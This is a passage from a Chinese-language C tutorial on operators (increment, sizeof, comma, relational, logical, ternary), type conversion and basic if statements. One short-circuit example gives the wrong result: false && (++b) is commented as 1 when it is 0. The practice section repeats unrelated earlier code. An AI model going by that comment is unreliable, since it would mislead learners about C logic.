    <span class="hljs-comment">// 表达式运算时为: 9 + 3;</span>
    <span class="hljs-type">int</span> result = --number + <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 12</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number); <span class="hljs-comment">// 9</span>
&#125;
</code></pre>
<ul>
<li>注意点:
<ul>
<li>自增、自减运算只能用于单个变量,只要是标准类型的变量,不管是整型、实型,还是字符型变量等,但不能用于表达式或常量
<ul>
<li>错误用法: <code>++(a+b); 5++;</code></li>
</ul>
</li>
<li>企业开发中尽量让++ – 单独出现, 尽量不要和其它运算符混合在一起</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> b = i++; <span class="hljs-comment">// 不推荐</span>
或者
<span class="hljs-type">int</span> b = ++i; <span class="hljs-comment">// 不推荐</span>
或者
<span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> b = ++a + a++;  <span class="hljs-comment">// 不推荐</span>
</code></pre>
<ul>
<li>请用如下代码替代</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> b = i; <span class="hljs-comment">// 推荐</span>
i++;
或者;
i++;
<span class="hljs-type">int</span> b = i; <span class="hljs-comment">// 推荐</span>
或者
<span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
++a;
<span class="hljs-type">int</span> b = a + a; <span class="hljs-comment">// 推荐</span>
a++;
</code></pre>
<ul>
<li>C语言标准没有明确的规定，<code>同一个表达式中同一个变量自增或自减后如何运算</code>, 不同编译器得到结果也不同, 在企业开发中千万不要这样写</li>
</ul>
<pre><code class="hljs c"> <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;
 <span class="hljs-comment">// 下列代码利用Qt运行时6, 利用Xcode运行是5</span>
 <span class="hljs-comment">// 但是无论如何, 最终a的值都是3</span>
<span class="hljs-comment">//  在C语言中这种代码没有意义, 不用深究也不要这样写</span>
<span class="hljs-comment">// 特点: 参与运算的是同一个变量, 参与运算时都做了自增自减操作, 并且在同一个表达式中</span>
 <span class="hljs-type">int</span> b = ++a + ++a;
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %i\n&quot;</span>, b); 
</code></pre>
<h2 id="sizeof运算符">sizeof运算符</h2>
<ul>
<li>
<p>sizeof可以用来计算一个变量或常量、数据类型所占的内存字节数</p>
<ul>
<li>标准格式: sizeof(常量 or 变量);</li>
</ul>
</li>
<li>
<p>sizeof的几种形式</p>
<ul>
<li>sizeof( 变量\常量 );
<ul>
<li>sizeof(10);</li>
<li>char c = ‘a’; sizeof©;</li>
</ul>
</li>
<li>sizeof 变量\常量;
<ul>
<li>sizeof 10;</li>
<li>char c = ‘a’; sizeof c;</li>
</ul>
</li>
<li>sizeof( 数据类型);
<ul>
<li>sizeof(float);</li>
<li>如果是数据类型不能省略括号</li>
</ul>
</li>
</ul>
</li>
<li>
<p>sizeof面试题:</p>
<ul>
<li>sizeof()和+=、*=一样是一个复合运算符, 由sizeof和()两个部分组成, 但是代表的是一个整体</li>
<li>所以sizeof不是一个函数, 是一个运算符, 该运算符的优先级是2</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">double</span> b = <span class="hljs-number">3.14</span>;
    <span class="hljs-comment">// 由于sizeof的优先级比+号高, 所以会先计算sizeof(a);</span>
    <span class="hljs-comment">// a是int类型, 所以占4个字节得到结果4</span>
    <span class="hljs-comment">// 然后再利用计算结果和b相加, 4 + 3.14 = 7.14</span>
    <span class="hljs-type">double</span> res = <span class="hljs-keyword">sizeof</span> a+b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;res = %lf\n&quot;</span>, res); <span class="hljs-comment">// 7.14</span>
&#125;
</code></pre>
<h2 id="逗号运算符">逗号运算符</h2>
<ul>
<li>在C语言中逗号“,”也是一种运算符,称为逗号运算符。 其功能是把多个表达式连接起来组成一个表达式,称为逗号表达式</li>
<li>逗号运算符会从左至右依次取出每个表达式的值, 最后整个逗号表达式的值等于最后一个表达式的值</li>
<li>格式: 表达式1，表达式2，… …，表达式n;
<ul>
<li>例如: int result = a+1,b=3*4;</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, b = <span class="hljs-number">20</span>, c;
    <span class="hljs-comment">// ()优先级高于逗号运算符和赋值运算符, 所以先计算()中的内容</span>
    <span class="hljs-comment">// c = (11, 21);</span>
    <span class="hljs-comment">// ()中是一个逗号表达式, 结果是最后一个表达式的值, 所以计算结果为21</span>
    <span class="hljs-comment">// 将逗号表达式的结果赋值给c, 所以c的结果是21</span>
    c = (a + <span class="hljs-number">1</span>, b + <span class="hljs-number">1</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %i\n&quot;</span>, c); <span class="hljs-comment">// 21</span>
&#125;
</code></pre>
<h2 id="关系运算符">关系运算符</h2>
<ul>
<li>为什么要学习关系运算符
<ul>
<li>默认情况下，我们在程序中写的每一句正确代码都会被执行。但很多时候，我们想在某个条件成立的情况下才执行某一段代码</li>
<li>这种情况的话可以使用条件语句来完成，但是学习条件语句之前，我们先来看一些更基础的知识：如何判断一个条件是否成立</li>
</ul>
</li>
</ul>
<p>C语言中的真假性</p>
<ul>
<li>
<p>在C语言中，条件成立称为“真”，条件不成立称为“假”，因此，判断条件是否成立，就是判断条件的“真假”</p>
</li>
<li>
<p>怎么判断真假呢？C语言规定，任何数值都有真假性，任何非0值都为“真”，只有0才为“假”。也就是说，108、-18、4.5、-10.5等都是“真”，0则是“假”<br>
<img src="https://img-blog.csdnimg.cn/img_convert/2625f1266cfbf4505a04c6b4b2fae5db.png" alt="img"></p>
</li>
<li>
<p>关系运算符的运算结果只有2种：如果条件成立，结果就为1，也就是“真”；如果条件不成立，结果就为0，也就是“假”</p>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>优先级</strong></th>
<th style="text-align:center"><strong>名称</strong></th>
<th style="text-align:center"><strong>符号</strong></th>
<th style="text-align:center"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">大于运算符</td>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">小于运算符</td>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">大于等于运算符</td>
<td style="text-align:center">&gt;=</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">小于等于运算符</td>
<td style="text-align:center">&lt;=</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">等于运算符</td>
<td style="text-align:center">==</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">不等于运算符</td>
<td style="text-align:center">!=</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
</tbody>
</table>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> result = <span class="hljs-number">10</span> &gt; <span class="hljs-number">5</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">5</span> &lt; <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">5</span> &gt; <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
    result = <span class="hljs-number">10</span> &gt;= <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">10</span> &lt;= <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">10</span> == <span class="hljs-number">10</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    result = <span class="hljs-number">10</span> != <span class="hljs-number">9</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
&#125;
</code></pre>
<ul>
<li>优先级和结合性</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// == 优先级 小于 &gt;, 所以先计算&gt;</span>
    <span class="hljs-comment">// result = 10 == 1; result = 0;</span>
    <span class="hljs-type">int</span> result = <span class="hljs-number">10</span> == <span class="hljs-number">5</span> &gt; <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// == 和 != 优先级一样, 所以按照结合性</span>
    <span class="hljs-comment">// 关系运算符是左结合性, 所以从左至右计算</span>
    <span class="hljs-comment">// result = 0 != 3; result = 1;</span>
    <span class="hljs-type">int</span> result = <span class="hljs-number">10</span> == <span class="hljs-number">5</span> != <span class="hljs-number">3</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
&#125;
</code></pre>
<ul>
<li>注意点:
<ul>
<li>无论是float还是double都有精度问题, 所以一定要避免利用==判断浮点数是否相等</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">float</span> a = <span class="hljs-number">0.1</span>;
    <span class="hljs-type">float</span> b = a * <span class="hljs-number">10</span> + <span class="hljs-number">0.00000000001</span>;
    <span class="hljs-type">double</span> c = <span class="hljs-number">1.0</span> + + <span class="hljs-number">0.00000000001</span>;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %f\n&quot;</span>, b);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %f\n&quot;</span>, c);
    <span class="hljs-type">int</span> result = b == c;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
&#125;
</code></pre>
<h2 id="逻辑运算符">逻辑运算符</h2>
<table>
<thead>
<tr>
<th style="text-align:center">优先级</th>
<th style="text-align:center"><strong>名称</strong></th>
<th style="text-align:center"><strong>符号</strong></th>
<th style="text-align:center"><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">逻辑非运算符</td>
<td style="text-align:center">!</td>
<td style="text-align:center">单目运算符,具有右结合性</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">逻辑与运算符</td>
<td style="text-align:center">&amp;&amp;</td>
<td style="text-align:center">双目运算符,具有左结合性</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">逻辑或运算符</td>
<td style="text-align:center">||</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<ul>
<li>逻辑非
<ul>
<li>格式: <code>! 条件A;</code></li>
<li>运算结果: 真变假,假变真</li>
<li>运算过程:
<ul>
<li>先判断条件A是否成立，如果添加A成立, 那么结果就为0，即“假”；</li>
<li>如果条件A不成立，结果就为1，即“真”</li>
</ul>
</li>
<li>使用注意:
<ul>
<li>可以多次连续使用逻辑非运算符</li>
<li>!!!0;相当于(!(!(!0)));最终结果为1</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">// ()优先级高, 先计算()里面的内容</span>
    <span class="hljs-comment">// 10==10为真, 所以result = !(1);</span>
    <span class="hljs-comment">// !代表真变假, 假变真,所以结果是假0</span>
    <span class="hljs-type">int</span> result = !(<span class="hljs-number">10</span> == <span class="hljs-number">10</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
&#125;
</code></pre>
<ul>
<li>逻辑与
<ul>
<li>格式: <code>条件A &amp;&amp; 条件B;</code></li>
<li>运算结果:一假则假</li>
<li>运算过程:
<ul>
<li>总是先判断&quot;条件A&quot;是否成立</li>
<li>如果&quot;条件A&quot;成立，接着再判断&quot;条件B&quot;是否成立, 如果&quot;条件B&quot;也成立，结果就为1，即“真”</li>
<li>如果&quot;条件A&quot;成立，&quot;条件B&quot;不成立，结果就为0，即“假”</li>
<li>如果&quot;条件A&quot;不成立，不会再去判断&quot;条件B&quot;是否成立, 因为逻辑与只要一个不为真结果都不为真</li>
</ul>
</li>
<li>使用注意:
<ul>
<li>&quot;条件A&quot;为假, &quot;条件B&quot;不会被执行</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">//               真     &amp;&amp;    真</span>
    <span class="hljs-type">int</span> result = (<span class="hljs-number">10</span> == <span class="hljs-number">10</span>) &amp;&amp; (<span class="hljs-number">5</span> != <span class="hljs-number">1</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">//          假     &amp;&amp;    真</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">9</span>) &amp;&amp; (<span class="hljs-number">5</span> != <span class="hljs-number">1</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
    <span class="hljs-comment">//          真     &amp;&amp;    假</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">10</span>) &amp;&amp; (<span class="hljs-number">5</span> != <span class="hljs-number">5</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
    <span class="hljs-comment">//          假     &amp;&amp;    假</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">9</span>) &amp;&amp; (<span class="hljs-number">5</span> != <span class="hljs-number">5</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;
    <span class="hljs-comment">// 逻辑与, 前面为假, 不会继续执行后面</span>
    <span class="hljs-type">int</span> result = (a == <span class="hljs-number">9</span>) &amp;&amp; (++b);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %i\n&quot;</span>, b); <span class="hljs-comment">// 20</span>
&#125;
</code></pre>
<ul>
<li>逻辑或
<ul>
<li>格式: <code>条件A || 条件B;</code></li>
<li>运算结果:一真则真</li>
<li>运算过程:
<ul>
<li>总是先判断&quot;条件A&quot;是否成立</li>
<li>如果&quot;条件A&quot;不成立，接着再判断&quot;条件B&quot;是否成立, 如果&quot;条件B&quot;成立，结果就为1，即“真”</li>
<li>如果&quot;条件A&quot;不成立，&quot;条件B&quot;也不成立成立, 结果就为0，即“假”</li>
<li>如果&quot;条件A&quot;成立, 不会再去判断&quot;条件B&quot;是否成立, 因为逻辑或只要一个为真结果都为真</li>
</ul>
</li>
<li>使用注意:
<ul>
<li>&quot;条件A&quot;为真, &quot;条件B&quot;不会被执行</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-comment">//               真     ||    真</span>
    <span class="hljs-type">int</span> result = (<span class="hljs-number">10</span> == <span class="hljs-number">10</span>) || (<span class="hljs-number">5</span> != <span class="hljs-number">1</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">//          假     ||    真</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">9</span>) || (<span class="hljs-number">5</span> != <span class="hljs-number">1</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">//          真     ||    假</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">10</span>) || (<span class="hljs-number">5</span> != <span class="hljs-number">5</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-comment">//          假     ||    假</span>
    result = (<span class="hljs-number">10</span> == <span class="hljs-number">9</span>) || (<span class="hljs-number">5</span> != <span class="hljs-number">5</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 0</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;
    <span class="hljs-comment">// 逻辑或, 前面为真, 不会继续执行后面</span>
    <span class="hljs-type">int</span> result = (a == <span class="hljs-number">10</span>) || (++b);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %i\n&quot;</span>, result); <span class="hljs-comment">// 1</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %i\n&quot;</span>, b); <span class="hljs-comment">// 20</span>
&#125;
</code></pre>
<h2 id="三目运算符">三目运算符</h2>
<ul>
<li>三目运算符，它需要3个数据或表达式构成条件表达式</li>
<li>格式: <code>表达式1？表达式2(结果A)：表达式3(结果B)</code>
<ul>
<li>示例: <code>考试及格 ? 及格 : 不及格;</code><br>
<img src="https://img-blog.csdnimg.cn/img_convert/47bcf1ddf7899400abb76c917b613962.png" alt="img"></li>
</ul>
</li>
<li>求值规则:
<ul>
<li>如果&quot;表达式1&quot;为真，三目运算符的运算结果为&quot;表达式2&quot;的值(结果A)，否则为&quot;表达式3&quot;的值(结果B)</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">示例:
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;
    <span class="hljs-type">int</span> max = (a &gt; b) ? a : b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %d&quot;</span>, max);
    输出结果: <span class="hljs-number">20</span>
等价于:
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;
    <span class="hljs-type">int</span> max = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span>(a&gt;b)&#123;
      max=a;
    &#125;<span class="hljs-keyword">else</span> &#123;
       max=b;
    &#125;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %d&quot;</span>, max);
</code></pre>
<ul>
<li>注意点
<ul>
<li>条件运算符的运算优先级低于关系运算符和算术运算符,但高于赋值符</li>
<li>条件运算符?和:是一个整体,不能分开使用</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">5</span>;
    <span class="hljs-comment">// 先计算 a &gt; b</span>
    <span class="hljs-comment">// 然后再根据计算结果判定返回a还是b</span>
    <span class="hljs-comment">// 相当于int max= (a&gt;b) ? a : b;</span>
    <span class="hljs-type">int</span> max= a&gt;b ? a : b;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %i\n&quot;</span>, max); <span class="hljs-comment">// 10</span>
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> b = <span class="hljs-number">5</span>;
    <span class="hljs-type">int</span> c = <span class="hljs-number">20</span>;
    <span class="hljs-type">int</span> d = <span class="hljs-number">10</span>;
    <span class="hljs-comment">// 结合性是从右至左, 所以会先计算:后面的内容</span>
    <span class="hljs-comment">// int res = a&gt;b?a:(c&gt;d?c:d);</span>
    <span class="hljs-comment">// int res = a&gt;b?a:(20&gt;10?20:10);</span>
    <span class="hljs-comment">// int res = a&gt;b?a:(20);</span>
    <span class="hljs-comment">// 然后再计算最终的结果</span>
    <span class="hljs-comment">// int res = 10&gt;5?10:(20);</span>
    <span class="hljs-comment">// int res = 10;</span>
    <span class="hljs-type">int</span> res = a&gt;b?a:c&gt;d?c:d;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;res = %i\n&quot;</span>, res);
&#125;
</code></pre>
<h2 id="类型转换">类型转换</h2>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>强制类型转换(显示转换)</strong></th>
<th style="text-align:center"><strong>自动类型转换(隐式转换)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">(需要转换的类型)(表达式)</td>
<td style="text-align:center">1.算数转换 2.赋值转换</td>
</tr>
</tbody>
</table>
<ul>
<li>强制类型转换(显示转换)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 将double转换为int</span>
<span class="hljs-type">int</span> a = (<span class="hljs-type">int</span>)<span class="hljs-number">10.5</span>;
</code></pre>
<ul>
<li>算数转换
<ul>
<li>系统会自动对占用内存较少的类型做一个“自动类型提升”的操作, 先将其转换为当前算数表达式中占用内存高的类型, 然后再参与运算</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 当前表达式用1.0占用8个字节, 2占用4个字节</span>
<span class="hljs-comment">// 所以会先将整数类型2转换为double类型之后再计算</span>
<span class="hljs-type">double</span> b = <span class="hljs-number">1.0</span> / <span class="hljs-number">2</span>;
</code></pre>
<ul>
<li>赋值转换</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 赋值时左边是什么类型,就会自动将右边转换为什么类型再保存</span>
<span class="hljs-type">int</span> a = <span class="hljs-number">10.6</span>;
</code></pre>
<ul>
<li>注意点:
<ul>
<li>参与计算的是什么类型, 结果就是什么类型</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 结果为0, 因为参与运算的都是整型</span>
<span class="hljs-type">double</span> a = (<span class="hljs-type">double</span>)(<span class="hljs-number">1</span> / <span class="hljs-number">2</span>);
<span class="hljs-comment">// 结果为0.5, 因为1被强制转换为了double类型, 2也会被自动提升为double类型</span>
<span class="hljs-type">double</span> b = (<span class="hljs-type">double</span>)<span class="hljs-number">1</span> / <span class="hljs-number">2</span>;
</code></pre>
<ul>
<li>类型转换并不会影响到原有变量的值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">double</span> d = <span class="hljs-number">3.14</span>;
    <span class="hljs-type">int</span> num = (<span class="hljs-type">int</span>)d;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %i\n&quot;</span>, num); <span class="hljs-comment">// 3</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d = %lf\n&quot;</span>, d); <span class="hljs-comment">// 3.140000</span>
&#125;
</code></pre>
<h2 id="阶段练习">阶段练习</h2>
<ul>
<li>从键盘输入一个整数, 判断这个数是否是100到200之间的数</li>
<li>表达式 6＝＝6＝＝6 的值是多少？</li>
<li>用户从键盘上输入三个整数,找出最大值,然后输入最大值</li>
<li>用两种方式交换两个变量的保存的值</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">double</span> d = <span class="hljs-number">3.14</span>;
    <span class="hljs-type">int</span> num = (<span class="hljs-type">int</span>)d;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %i\n&quot;</span>, num); <span class="hljs-comment">// 3</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d = %lf\n&quot;</span>, d); <span class="hljs-comment">// 3.140000</span>
&#125;
</code></pre>
<h2 id="流程控制基本概念">流程控制基本概念</h2>
<ul>
<li>默认情况下程序运行后，系统会按书写顺序从上至下依次执行程序中的每一行代码。但是这并不能满足我们所有的开发需求, 为了方便我们控制程序的运行流程，C语言提供3种流程控制结构，不同的流程控制结构可以实现不同的运行流程。</li>
<li>这3种流程结构分别是顺序结构、选择结构、循环结构</li>
<li>顺序结构:
<ul>
<li>按书写顺序从上至下依次执行<br>
<img src="https://img-blog.csdnimg.cn/img_convert/9071191723644a2b0364126c8a5bd65f.png" alt="img"></li>
</ul>
</li>
<li>选择结构
<ul>
<li>对给定的条件进行判断，再根据判断结果来决定执行代码<br>
<img src="https://img-blog.csdnimg.cn/img_convert/0e8b2f8b6230aedf754eab312605ce23.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/e4452dcd9857466ecc0957fb4453b3a3.png" alt="img"></li>
</ul>
</li>
<li>循环结构
<ul>
<li>在给定条件成立的情况下，反复执行某一段代码<br>
<img src="https://img-blog.csdnimg.cn/img_convert/1d3e73c0371f8adfaf2c606a303df9b3.png" alt="img"><br>
<img src="https://img-blog.csdnimg.cn/img_convert/7bd28dbf878c0deb1f09a33a00705a23.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="选择结构">选择结构</h2>
<ul>
<li>C语言中提供了两大选择结构, 分别是if和switch<br>
##选择结构if</li>
<li>if第一种形式
<ul>
<li>表示如果表达式为真,执行语句块1,否则不执行</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(表达式) &#123;
  语句块<span class="hljs-number">1</span>;
&#125;
后续语句;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(age &gt;= <span class="hljs-number">18</span>) &#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;结婚\n&quot;</span>);
&#125;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;谈恋爱\n&quot;</span>);
</code></pre>
<ul>
<li>if第二种形式
<ul>
<li>如果表达式为真,则执行语句块1,否则执行语句块2</li>
<li>else不能脱离if单独使用</li>
</ul>
</li>
</ul>
